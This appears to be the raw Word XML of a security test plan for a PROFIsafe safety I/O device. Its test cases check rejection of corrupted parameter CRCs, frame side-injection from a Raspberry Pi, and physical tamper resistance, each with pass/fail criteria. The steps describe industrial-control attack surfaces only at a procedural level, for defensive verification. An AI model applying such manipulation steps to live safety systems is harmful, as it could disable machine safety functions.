      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="4C019F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F911E" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TS-</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16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F08F5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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Physical tamper-resistance</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">remove seal, alter rotary switch, reboot; verify (a) runtime change is ignored (temporal protection) and (b) the next-boot address </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>can</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> be corrupted, with only the seal resisting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78FC6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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Proves G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>(resistance-only physical protection)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360A4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lastRenderedPageBreak/>
              <w:t xml:space="preserve">OWASP ISTG </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ISTG-</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>PHY</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; EDR 3.11 resistance limb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F58E1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lastRenderedPageBreak/>
              <w:t>SVV-</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (PA-4)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="755A9E27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i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">(Note: the check of whether a physical intervention is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>logged/recorded</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> has been moved to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003 / TC-RQ003-03</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — it is not part of RQ-002.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307245B7" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-2/TS-3/TS-4 side-inject on the Pi (eth0 = 192.168.0.100, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EtherType</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x8892), captured on the laptop mirror; TS-5 requires </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>invasive physical access (PA-4)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, isolated-lab, PLC-monitored. </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId39" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2AE94796" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="539B2290">
          <v:rect id="_x0000_i1034" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="526C119E" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16ECC938" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the anchor (TS-1), the decisive G-1 proof (TS-3), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>corrected</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> physical-resistance test (TS-5). </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve">TS-2/TS-4 follow </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve"> same </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>template</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>request</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F035A0" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="0189CD40">
          <v:rect id="_x0000_i1035" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E45EB27" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">TC-RQ002-01 — Parameter-CRC </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Rejection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5B2191" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16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710"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="19C55D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38ED2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2ACB49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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="247D3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EEBE1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BEE2E" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TC-RQ002-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="1F045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07893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E8801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RQ-002 (EHSR 1.1.9 §1) → CR 3.4 → Asset C (config at rest)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="5FF2F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60105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1C1C1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t>Tampering</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>parameter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set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="151A5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137FA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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A1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D1DBB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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="557C5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C2A97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AB19B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 xml:space="preserve">Demonstrate that the F-Device validates the parameter set and </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>rejects</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a configuration whose </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> does not match, remaining in the safe (Parametrization) state.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="66377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AE6D1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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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59D11" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Baseline. 2. Present a configuration with a deliberately incorrect </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (then </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">). </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">3. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>Observe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device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state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>diagnostics</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>qualifiers</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="45AC9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CAFA3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AFEC5" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> mismatch triggers </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EC3</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, the device stays in Parametrization, qualifiers remain bad, and no OPERATE handshake completes. </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>mismatched</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">-CRC </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>configuration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is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accepted</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A21A62A" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16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6810"/>
        <w:gridCol w:w="96"/>
        <w:gridCol w:w="765"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="1886FE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F05B1F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E48123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3B037D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01C248" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="0589B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DA6FC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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16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BCB77" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TC-RQ002-01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97DBB" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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93F2F" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="7119E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DEC55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03D84" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">SPS 192.168.0.1, SRIO DUT 192.168.0.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>laptop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mirror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4B31D" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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84849" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="19500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1C97F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BB2D3" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TIA Portal (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>manipulate</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> F-parameter CRC </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>field</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>), Wireshark (`</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>pn_rt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83080" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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99544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t>pnio</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>`)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="1F898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3CDDA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Procedure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CE576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 xml:space="preserve">(1) Baseline OPERATE; (2) force </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_iPar_CRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> wrong, download; (3) repeat for </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Par_CRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; (4) read PLC diagnostic buffer for EC3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B9B5D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3FACE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</w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="41915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3DA4F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lastRenderedPageBreak/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B0276" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">☐ PASS ☐ FAIL — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>: 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A22C9" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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56284" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="6F5E2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F7AC1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53447" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">TC01_iparcrc.pcapng, PLC </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>diagnostic-buffer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export</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">, DUT FS-LED </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>photo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34C80" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
